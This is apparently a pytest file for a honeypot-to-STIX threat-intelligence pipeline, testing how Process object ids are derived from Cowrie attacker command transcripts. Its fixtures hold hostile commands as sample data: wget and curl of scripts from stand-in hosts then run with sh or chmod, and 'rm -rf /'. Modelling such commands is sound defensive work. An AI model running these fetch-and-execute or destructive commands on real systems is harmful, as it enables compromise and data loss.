"""A Process models a command sequence, not one execution of it.

The id was `generate_process_id(sensor, session_id)` — unique per session.
Measured on the live corpus 2026-08-06: one Process observable had
accumulated **11,485 alias STIX ids**, and ~332,000 distinct ids had
collapsed into 3,663 objects. `object_max_state` carried 1,015,137 rows for
a ~108k-object graph, and every Process was re-emitted under a new id every
cycle so the publisher could never skip it.
"""
from __future__ import annotations

from datetime import datetime, timezone

from tpot2cti.parsers.base import AttackSession

NOW = datetime(2026, 8, 6, tzinfo=timezone.utc)
CMDS = ["uname -a", "cat /proc/cpuinfo", "wget http://evil.example/x.sh"]


def _session(sid="s1", sensor="sensor01", ip="203.0.113.1"):
    return AttackSession(src_ip=ip, session_id=sid, sensor_hostname=sensor,
                         event_type="Cowrie", first_seen=NOW, last_seen=NOW)


def _full_session(**kw):
    """A session built the way the parsers build one.

    build_cowrie_session returns [] for a hand-constructed AttackSession, so
    the whole-session tests below must go through ParsedEvent — otherwise they
    would pass by asserting over an empty list.
    """
    from tpot2cti.parsers.base import ParsedEvent
    ev = ParsedEvent(src_ip="203.0.113.1", timestamp=NOW, sensor_hostname="s1",
                     event_type="Cowrie", dst_port=22,
                     src_country_code="DE", src_asn=64512)
    ev.meta = {}
    s = AttackSession.from_event(ev)
    for k, v in kw.items():
        setattr(s, k, v)
    return s


def test_the_same_commands_reach_one_observable(cfg):
    """The regression lock. Two sessions, same transcript, one Process.

    Deliberately uses two FRESH builders rather than one. With a single
    builder the second call returns None from `_dedup` (already emitted this
    bundle), and a test that accepts None as agreement passes no matter what
    the id is — it asserts nothing. Separate builders force both ids to exist.
    """
    from tpot2cti.stix.builder import STIXBuilder
    a = STIXBuilder(cfg).build_process(_session("s1"), CMDS)
    b = STIXBuilder(cfg).build_process(_session("s2", ip="198.51.100.9"), CMDS)
    assert a is not None and b is not None, "guard: both must actually be built"
    assert a["id"] == b["id"], (
        "identical transcripts still mint different Process ids — this is the "
        "11,485-alias defect"
    )


def test_different_commands_stay_distinct(builder):
    """The positive control — over-collapsing would merge unrelated actors."""
    a = builder.build_process(_session("s1"), CMDS)
    b = builder.build_process(_session("s2"), ["rm -rf /", "echo pwned"])
    assert a["id"] != b["id"]


def test_the_id_does_not_depend_on_session_or_sensor(cfg):
    """Session id and sensor were the old seed. Neither should move the id."""
    from tpot2cti.stix.builder import STIXBuilder
    a = STIXBuilder(cfg).build_process(_session("aaa", sensor="node1"), CMDS)
    b = STIXBuilder(cfg).build_process(_session("zzz", sensor="node2"), CMDS)
    assert a is not None and b is not None
    assert a["id"] == b["id"]


def test_the_id_is_stable_across_builders(cfg):
    """Deterministic across processes and restarts, or replay diverges."""
    from tpot2cti.stix.builder import STIXBuilder
    x = STIXBuilder(cfg).build_process(_session(), CMDS)
    y = STIXBuilder(cfg).build_process(_session("other"), CMDS)
    assert x["id"] == y["id"]


# --- the edge anchor must not outlive the node -------------------------------
#
# _link_download_chain emits Process → File. It recomputes the Process id
# rather than being handed the object, so it can anchor on a Process that
# build_process declined to emit — a dangling ref OpenCTI accepts and then
# silently never resolves. The id being content-addressed makes this MORE
# likely to go unnoticed, not less: the id is always derivable now, even when
# the node is absent.

def test_no_process_edge_when_the_process_was_dropped(cfg):
    """Recon-only + a download: build_process returns None, so no anchor."""
    from tpot2cti.stix.builder import STIXBuilder
    sha = "b" * 64
    assert cfg.cycle.drop_recon_process, "guard: fixture relies on the default"
    s = _full_session(
        commands=["uname -a", "whoami"],         # pure recon → Process dropped
        malware_hashes=[sha],
        downloads=[{"sha256": sha, "url": "http://203.0.113.7/x.sh"}],
    )
    b = STIXBuilder(cfg)
    assert b.build_process(s, s.commands) is None, (
        "guard: this fixture must actually trigger the recon drop, or the "
        "test proves nothing"
    )
    objs = b.build_cowrie_session(s)
    proc_ids = {o["id"] for o in objs if o.get("type") == "process"}
    dangling = [
        o for o in objs
        if o.get("type") == "relationship"
        and o.get("source_ref", "").startswith("process--")
        and o["source_ref"] not in proc_ids
    ]
    assert not dangling, f"edge anchored on an unemitted Process: {dangling}"


def test_the_process_edge_still_appears_when_the_process_is_kept(cfg):
    """Positive control — the guard must not suppress the legitimate edge."""
    from tpot2cti.stix.builder import STIXBuilder
    sha = "c" * 64
    s = _full_session(
        commands=["wget http://203.0.113.7/x.sh", "chmod +x x.sh"],
        malware_hashes=[sha],
        downloads=[{"sha256": sha, "url": "http://203.0.113.7/x.sh"}],
    )
    objs = STIXBuilder(cfg).build_cowrie_session(s)
    proc_ids = {o["id"] for o in objs if o.get("type") == "process"}
    assert proc_ids, "guard: a non-recon session must still emit a Process"
    assert any(
        o.get("type") == "relationship" and o.get("source_ref") in proc_ids
        and o.get("target_ref", "").startswith("file--")
        for o in objs
    ), "the guard suppressed a legitimate Process→File edge"


# --- what the id is actually made of ------------------------------------------
#
# Codex's review of PR #43 made the point that the tests above use short, plain
# command lists, so an implementation that just did "\n".join(commands) would
# pass all of them. These pin the two transforms that make the id more than a
# join.

def test_tempfile_paths_are_normalised_into_the_id(cfg):
    """The scp malware-drop probes are one behaviour, not thousands."""
    from tpot2cti.stix_ids import generate_process_id
    a = generate_process_id(["scp -qt /tmp/aB3xK9qmZ"])
    b = generate_process_id(["scp -qt /tmp/Qw7zLp2vT"])
    assert a == b, "random tempfile names still fragment Process identity"
    # ...but the directory is still part of the identity
    assert a != generate_process_id(["scp -qt /dev/shm/aB3xK9qmZ"])


def test_a_path_outside_the_known_temp_dirs_is_not_normalised(cfg):
    """Documents the known gap rather than pretending it is closed.

    ~222 live transcripts use `scp -t /usr/local/bin/<random>`. They still
    fragment. This test exists so that widening _TMPFILE_RE is a deliberate
    change with a failing test, not a silent behaviour shift.
    """
    from tpot2cti.stix_ids import generate_process_id
    assert generate_process_id(["scp -qt /usr/local/bin/aB3xK9qmZ"]) != \
        generate_process_id(["scp -qt /usr/local/bin/Qw7zLp2vT"])


def test_truncated_transcripts_differ_by_tail_not_just_by_count(cfg):
    """A COUNT in the truncation marker would collide two real transcripts.

    Same first 50 commands, same number omitted, different omitted content:
    with `... and N more` these were one Process. They are different sessions
    and must be different objects.
    """
    from tpot2cti.stix_ids import generate_process_id, MAX_COMMANDS_PER_PROCESS
    head = [f"echo {i}" for i in range(MAX_COMMANDS_PER_PROCESS)]
    a = generate_process_id(head + ["curl http://a.example/x", "sh x"])
    b = generate_process_id(head + ["curl http://b.example/y", "sh y"])
    assert a != b, "different omitted tails collapsed into one Process id"


def test_the_command_list_must_be_a_list(cfg):
    """A str slices and iterates happily — it would address on 50 CHARACTERS."""
    import pytest
    from tpot2cti.stix_ids import process_command_line
    with pytest.raises(TypeError):
        process_command_line("uname -a\nwhoami")


# --- the shared object must not claim a single owner --------------------------

def test_the_process_carries_no_per_session_attribution(cfg):
    """One transcript, two attackers, two sensors — the object is shared, so
    naming one of them on it would be false for the other."""
    from tpot2cti.stix.builder import STIXBuilder
    p = STIXBuilder(cfg).build_process(
        _session("s1", sensor="sensor01", ip="203.0.113.1"), CMDS,
    )
    blob = repr(p)
    assert "203.0.113.1" not in blob, "source IP is on the shared Process object"
    assert "sensor01" not in blob, "sensor identity is on the shared Process object"
    assert not any(l.startswith("sensor:") for l in p["x_opencti_labels"]), \
        f"sensor label on a shared object: {p['x_opencti_labels']}"
    assert "command-transcript" in p["x_opencti_labels"], "guard: labels intact"
